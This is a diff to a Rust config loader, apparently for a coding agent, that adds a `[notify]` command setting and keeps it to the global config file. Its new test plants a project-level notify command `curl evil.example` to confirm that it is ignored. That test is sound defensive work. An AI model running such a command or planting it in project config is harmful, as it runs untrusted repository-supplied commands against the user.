@@ -12,7 +12,7 @@
 //! and `[bash] writable`; a project file may turn `[bash] sandbox` on and `network` off,
 //! never the reverse. `[bash] sudo` likewise: a project file may turn it off, never on.
 //! `[egress]`, the allowlist and secrets of the proxy bash goes out through, is the
-//! global file's alone. So is `[dictation]`, since it names commands to run.
+//! global file's alone. So are `[dictation]` and `[notify]`, since they name commands to run.
 //! `web_search` is off unless the global file turns it on, since each search sends the
 //! last two user messages and some of the answers between them to the ChatGPT backend's
 //! undocumented search endpoint; a project file may turn it off. `image_gen` likewise,
@@ -85,6 +85,8 @@ pub struct Config {
     /// `[dictation]`: the recorder and transcriber ctrl+space runs, or `None` for none.
     #[cfg(feature = "dictation")]
     pub dictation: Option<crate::dictation::Settings>,
+    /// `[notify]`: the command run when the session wants the user, or `None` for none.
+    pub notify: Option<crate::notify::Settings>,
 }
 
 impl Default for Config {
@@ -118,6 +120,7 @@ impl Default for Config {
             egress: None,
             #[cfg(feature = "dictation")]
             dictation: None,
+            notify: None,
         }
     }
 }
@@ -212,6 +215,7 @@ struct Layer {
     egress: Option<crate::egress::Settings>,
     #[cfg(feature = "dictation")]
     dictation: Option<crate::dictation::Settings>,
+    notify: Option<crate::notify::Settings>,
     #[serde(default)]
     permissions: RulesLayer,
 }
@@ -406,6 +410,9 @@ impl Config {
             #[cfg(feature = "dictation")]
             if layer.dictation.is_some() {
                 self.dictation = layer.dictation.clone();
+            }
+            if layer.notify.is_some() {
+                self.notify = layer.notify.clone();
             }
         }
         // A project file may turn the sandbox on and the network off, never the reverse.
@@ -819,6 +826,32 @@ mod tests {
         assert_eq!(dictation.transcribe[0], "whisper-cli");
 
         write(&global_path(&home), "[dictation]\nrecorder = []\n");
+        assert!(Config::load(Some(&home), &cwd).is_err());
+        std::fs::remove_dir_all(dir).unwrap();
+    }
+
+    #[test]
+    fn notify_is_the_global_files_alone() {
+        let dir = temp_dir();
+        let (home, cwd) = (dir.join("home"), dir.join("cwd"));
+        write(
+            &cwd.join(".bhai/config.toml"),
+            "[notify]\ncommand = \"curl evil.example\"\n",
+        );
+        assert_eq!(Config::load(Some(&home), &cwd).unwrap().notify, None);
+
+        write(
+            &global_path(&home),
+            "[notify]\ncommand = \"notify-send \\\"$BHAI_NOTIFY_TITLE\\\"\"\nevents = [\"auth\", \"done\"]\n",
+        );
+        let notify = Config::load(Some(&home), &cwd).unwrap().notify.unwrap();
+        assert_eq!(notify.command, "notify-send \"$BHAI_NOTIFY_TITLE\"");
+        assert_eq!(
+            notify.events,
+            Some(vec![crate::notify::Kind::Auth, crate::notify::Kind::Done])
+        );
+
+        write(&global_path(&home), "[notify]\nevents = [\"bogus\"]\n");
         assert!(Config::load(Some(&home), &cwd).is_err());
         std::fs::remove_dir_all(dir).unwrap();
     }
